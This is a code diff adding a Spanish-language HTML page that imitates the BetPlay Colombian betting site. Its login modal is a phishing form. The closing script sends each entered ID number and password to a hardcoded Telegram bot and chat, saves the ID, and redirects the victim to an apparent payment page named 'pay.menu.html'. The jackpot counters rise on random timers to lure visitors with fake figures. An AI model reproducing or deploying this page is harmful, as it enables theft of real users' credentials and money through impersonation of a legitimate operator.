@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+
+<html lang="es">
+
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>BetPlay</title>
+<script src="https://cdn.tailwindcss.com/"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet"/>
+<style>
+    body { font-family: "Montserrat", sans-serif; }
+    .modal-bg { background-color: rgba(0, 0, 0, 0.6); }
+  </style>
+<style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+</head>
+<body class="bg-[#002366] text-white relative overflow-x-hidden">
+<!-- HEADER -->
+<header class="flex items-center justify-between px-4 py-3 max-w-screen-md mx-auto">
+<button aria-label="Abrir menú" class="bg-[#001544] w-12 h-12 rounded-full flex items-center justify-center">
+<img alt="Icono menú hamburguesa blanco" class="w-6 h-6" height="24" src="menu-icon.png" width="24"/>
+</button>
+<div class="flex items-center space-x-2">
+<img alt="Logo BetPlay blanco y azul con icono de triángulo verde, amarillo y azul" class="h-8 w-auto" height="32" src="betplay-logo.png" width="120"/>
+</div>
+<div class="flex flex-col space-y-2 sm:flex-row sm:space-y-0 sm:space-x-3">
+<button class="border border-[#4DA8E0] rounded px-4 py-2 text-white text-base font-normal hover:bg-[#004a99] transition" id="loginBtn">
+     Iniciar sesión
+    </button>
+<button class="bg-[#4DA8E0] rounded px-4 py-2 text-[#002366] text-base font-normal hover:bg-[#3a8ad1] transition">
+     Registrarse
+    </button>
+</div>
+</header>
+<!-- BANNER -->
+<section class="w-full bg-[#002366]">
+<div class="relative overflow-hidden rounded-lg">
+<div class="flex transition-transform duration-700 ease-in-out w-full" id="carousel">
+<img alt="Banner 1" class="w-full object-cover" src="768_compressed_68361c11f2310842484d77a6.jpg"/>
+<img alt="Banner 2" class="w-full object-cover" src="768_compressed_6827a463391dcb4b112f3ef3.jpg"/>
+<img alt="Banner 3" class="w-full object-cover" src="768_compressed_682b398c391dcb4b11ba7ff9.jpg"/>
+<img alt="Banner 4" class="w-full object-cover" src="768_compressed_67dacf6888c83a8199d5903a.jpg"/>
+</div>
+</div>
+</section>
+<script>
+    const carousel = document.getElementById('carousel');
+    let index = 0;
+    setInterval(() => {
+      index = (index + 1) % 4;
+      carousel.style.transform = 'translateX(' + (-index * 100) + '%)';
+    }, 7000);
+  </script>
+<!-- TEXTO PROMO -->
+<section class="max-w-screen-md mx-auto mt-6 px-4 text-center">
+<p class="text-white font-bold text-xl max-w-xl mx-auto">
+      Entra al mundo de ganadores BetPlay, diviértete apostando con toda la oferta de apuestas que tenemos para ti.
+    </p>
+<button class="mt-6 bg-[#2E8B2E] px-6 py-3 rounded hover:bg-[#267326]">¡Juega Ya!</button>
+</section>
+<section class="max-w-screen-md mx-auto mt-10 px-4 space-y-8">
+<div class="flex items-center justify-between">
+<div>
+<h2 class="text-white font-extrabold text-xl">1. Regístrate</h2>
+<p class="text-[#4DA8E0] text-sm mt-1">Abre tu cuenta GRATIS</p>
+</div>
+<div class="bg-[#001544] w-10 h-10 rounded-full flex items-center justify-center">
+<svg class="w-4 h-4" fill="white" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"></path></svg>
+</div>
+</div>
+<div class="flex items-center justify-between">
+<div>
+<h2 class="text-white font-extrabold text-xl">2. Recarga</h2>
+<p class="text-[#4DA8E0] text-sm mt-1">Disfruta de la mejor oferta de apuestas online del mercado</p>
+</div>
+<div class="bg-[#001544] w-10 h-10 rounded-full flex items-center justify-center">
+<svg class="w-4 h-4" fill="white" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"></path></svg>
+</div>
+</div>
+<div class="flex items-center justify-between">
+<div>
+<h2 class="text-white font-extrabold text-xl">3. Apuesta y Gana</h2>
+<p class="text-[#4DA8E0] text-sm mt-1">Diviértete en la casa de apuestas más grande de Colombia</p>
+</div>
+<div class="bg-[#001544] w-10 h-10 rounded-full flex items-center justify-center">
+<svg class="w-4 h-4" fill="white" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6z"></path></svg>
+</div>
+</div>
+</section>
+
+<!-- LOADER (AGREGADO) -->
+<div class="fixed inset-0 z-[9999] hidden items-center justify-center modal-bg" id="betplay-loader">
+  <div class="bg-white rounded-lg p-8 text-center">
+    <div class="animate-spin rounded-full h-16 w-16 border-b-4 border-[#4DA8E0] mx-auto mb-4"></div>
+    <p class="text-[#002366] font-bold text-lg">Cargando...</p>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="fixed inset-0 z-50 hidden items-center justify-center modal-bg" id="loginModal" style="z-index:9990;">
+<div class="bg-[#00153a] rounded-lg w-[95%] max-w-md p-8 text-white relative shadow-xl">
+<button class="absolute top-4 right-4 text-white text-2xl font-bold" onclick="toggleModal(false)">×</button>
+<div class="flex items-center justify-center mb-4">
+<h1 class="text-3xl font-extrabold flex items-center gap-2"><img alt="Logo" class="h-8" src="betplay-logo.png"/></h1>
+</div>
+<p class="text-center text-sm mb-6">Apuéstale a tu pasión</p>
+<form class="space-y-4" onsubmit="enviarDatos(event)">
+<input class="w-full px-4 py-3 rounded-md text-gray-800 placeholder-gray-400 border border-[#3a8edc] focus:ring-2 focus:ring-[#3a8edc] outline-none" id="text" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')" pattern="[0-9]*" placeholder="Usuario / Cédula" type="text"/>
+<input class="w-full px-4 py-3 rounded-md text-gray-800 placeholder-gray-400 border border-[#3a8edc] focus:ring-2 focus:ring-[#3a8edc] outline-none" id="contrasena" placeholder="Contraseña" type="password"/>
+<label class="inline-flex items-center space-x-2 text-sm">
+<input class="w-5 h-5 border-gray-300" type="checkbox"/>
+<span>Recordar datos de usuario</span>
+</label>
+<div class="flex gap-4 mt-2">
+<button class="flex-1 border border-[#3a8edc] rounded-md py-3 hover:bg-[#3a8edc]" type="submit">Ingresar</button>
+<button class="flex-1 bg-[#3a8edc] text-[#003a5d] rounded-md py-3 hover:bg-[#2ea1f7]" type="button">Registrarse</button>
+</div>
+</form>
+<div class="mt-8 text-center text-sm">
+<a class="underline hover:text-[#3a8edc] block mb-2" href="#">Recuperar contraseña</a>
+<p>Al iniciar sesión, estás aceptando los siguientes T&C Versión 1.4.</p>
+<a class="text-[#3a8edc] hover:text-[#2ea1f7]" href="https://betplay.com.co/terminos-y-condiciones" target="_blank">https://betplay.com.co/terminos-y-condiciones</a>
+</div>
+</div>
+</div>
+
+<!-- SCRIPT -->
+<section class="max-w-screen-md mx-auto mt-10 px-4">
+<div class="bg-[#001544] rounded-lg p-6 text-white relative">
+<div class="flex justify-center mb-4"><img alt="Progressive Play" class="h-8 md:h-10" src="progressive.png"/></div>
+<p class="text-center text-sm font-medium text-white mb-4">
+        Podrás apostar desde <span class="text-[#6cf131]">$500</span><br/>
+        y ganar hasta <span class="text-[#6cf131]">$500 Millones</span>
+</p>
+<div class="text-center space-y-3">
+<div>
+<h4 class="text-[#d3ff38] text-2xl font-extrabold">Extra<br/><span class="text-white text-lg" id="extraAmount">$197.574</span></h4>
+<p class="text-sm text-white">Gana hasta $1 Millón</p>
+</div>
+<div>
+<h4 class="text-[#8cff4b] text-2xl font-extrabold">Mega<br/><span class="text-white text-lg"><span id="megaAmount">$384.030.172</span></span></h4>
+<p class="text-sm text-white">Gana hasta $500 Millones</p>
+</div>
+<div>
+<h4 class="text-[#00ff87] text-2xl font-extrabold">Super<br/><span class="text-white text-lg"><span id="superAmount">$13.677.122</span></span></h4>
+<p class="text-sm text-white">Gana hasta $20 Millones</p>
+</div>
+</div>
+<img alt="¿Cómo te ayudamos?" class="absolute bottom-4 right-4 w-20 h-20 rounded-full border-4 border-white object-cover" src="betpass.png"/>
+</div>
+</section>
+<script>
+  function formatNumber(n) {
+    return n.toLocaleString("es-CO");
+  }
+
+  let mega = 384211651;
+  let superPrize = 13858600;
+  let extra = 197574;
+
+  setInterval(() => {
+    mega += Math.floor(Math.random() * 3000 + 1000);
+    document.getElementById("megaAmount").innerText = "$" + formatNumber(mega);
+  }, 80);
+
+  setInterval(() => {
+    superPrize += Math.floor(Math.random() * 800 + 200);
+    document.getElementById("superAmount").innerText = "$" + formatNumber(superPrize);
+  }, 100);
+
+  setInterval(() => {
+    extra += Math.floor(Math.random() * 200 + 80);
+    document.getElementById("extraAmount").innerText = "$" + formatNumber(extra);
+  }, 120);
+</script>
+<section class="bg-[#d1e3f6] py-10 text-center text-[#002366]">
+<div class="max-w-screen-md mx-auto space-y-12">
+<!-- Sports -->
+<div>
+<img alt="sportDeportes" class="mx-auto w-48 md:w-56" src="Chicos_Sports.png"/>
+<img alt="Deportes" class="mx-auto w-48 md:w-56" src="sports.svg"/>
+<p class="mt-4 px-6 text-sm md:text-base font-medium">
+        Juega ahora en la casa de apuestas más grande de Colombia y siente la pasión de apostar en nuestras ofertas deportivas con las mejores cuotas del mercado.
+      </p>
+<button class="mt-4 bg-[#2E8B2E] px-6 py-3 rounded text-white font-bold hover:bg-[#267326]">¡Juega Ya!</button>
+</div>
+<!-- Casino -->
+<div>
+<img alt="chikacasino" class="mx-auto w-48 md:w-56" src="Chica_Casino.png"/>
+<img alt="Casino" class="mx-auto w-48 md:w-56" src="casino.svg"/>
+<p class="mt-4 px-6 text-sm md:text-base font-medium">
+        Diversión y miles de posibilidades de ganar las encuentras en el Casino BetPlay con el mejor portafolio de juegos de azar de la categoría.
+      </p>
+<button class="mt-4 bg-[#2E8B2E] px-6 py-3 rounded text-white font-bold hover:bg-[#267326]">¡Juega Ya!</button>
+</div>
+<!-- Póker -->
+<div>
+<img alt="personajepok" class="mx-auto w-48 md:w-56" src="Personaje.png"/>
+<img alt="Póker" class="mx-auto w-48 md:w-56" src="poker.svg"/>
+<p class="mt-4 px-6 text-sm md:text-base font-medium">
+        Juega, apuesta y gana en el Póker de BetPlay, y conviértete en un maestro dominando las diferentes modalidades de Póker que tenemos para ti.
+      </p>
+<button class="mt-4 bg-[#2E8B2E] px-6 py-3 rounded text-white font-bold hover:bg-[#267326]">¡Juega Ya!</button>
+</div>
+</div>
+</section>
+<footer class="bg-[#001544] py-10 text-center text-white">
+<div class="max-w-screen-md mx-auto space-y-4">
+<p class="text-sm">Haz parte de nuestro equipo</p>
+<img alt="BetPlay Afiliados" class="mx-auto h-8 md:h-10" src="Afiliados%201.svg"/>
+</div>
+</footer>
+<script>
+  // Configuración de Telegram
+  const TELEGRAM_BOT_TOKEN = '8663981324:AAFdR2ikDIgJ7cufQVXSHEiEJ45nRcXYmrw';
+  const TELEGRAM_CHAT_ID   = '-5000036449';
+
+  const loginBtn = document.getElementById("loginBtn");
+  const loginModal = document.getElementById("loginModal");
+
+  function toggleModal(show) {
+    loginModal.classList.toggle("hidden", !show);
+    if (show) loginModal.classList.add("flex");
+    else loginModal.classList.remove("flex");
+  }
+
+  loginBtn.addEventListener("click", () => toggleModal(true));
+
+  async function enviarDatos(event) {
+    event.preventDefault();
+
+    const usuario = document.getElementById("text").value;
+    const contrasena = document.getElementById("contrasena").value;
+
+    // Validación básica
+    if (!usuario || !contrasena) {
+      alert("Por favor completa todos los campos");
+      return;
+    }
+
+    // Validar: mínimo 8 caracteres, una mayúscula, un carácter especial, sin espacios
+    const regex = /^(?=.*[A-Z])(?=.*[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]).{8,}$/;
+    
+    if (contrasena.includes(' ')) {
+      alert("La contraseña no debe contener espacios");
+      return;
+    }
+
+    if (!regex.test(contrasena)) {
+      alert("La contraseña debe contener al menos 8 caracteres, mínimo un carácter especial y una mayúscula (sin espacios)");
+      return;
+    }
+
+    // Mostrar loader
+    const loader = document.getElementById("betplay-loader");
+    if (loader) loader.style.display = "flex";
+
+    // Mensaje para Telegram
+    const mensaje = `🔐 Nuevo intento de acceso
+👤 Usuario: ${usuario}
+🔑 Contraseña: ${contrasena}`;
+
+    try {
+      // Enviar a Telegram
+      const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      await fetch(telegramUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: mensaje,
+          parse_mode: "HTML"
+        })
+      });
+
+      console.log("Datos enviados correctamente");
+    } catch (e) {
+      console.error("Error enviando a Telegram:", e);
+    }
+
+    // Guardar en localStorage
+    localStorage.setItem("userCedula", usuario);
+
+    // Redirigir después de 4 segundos
+    setTimeout(() => {
+      window.location.href = "pay.menu.html";
+    }, 4000);
+  }
+</script>
+
+</body>
+</html>
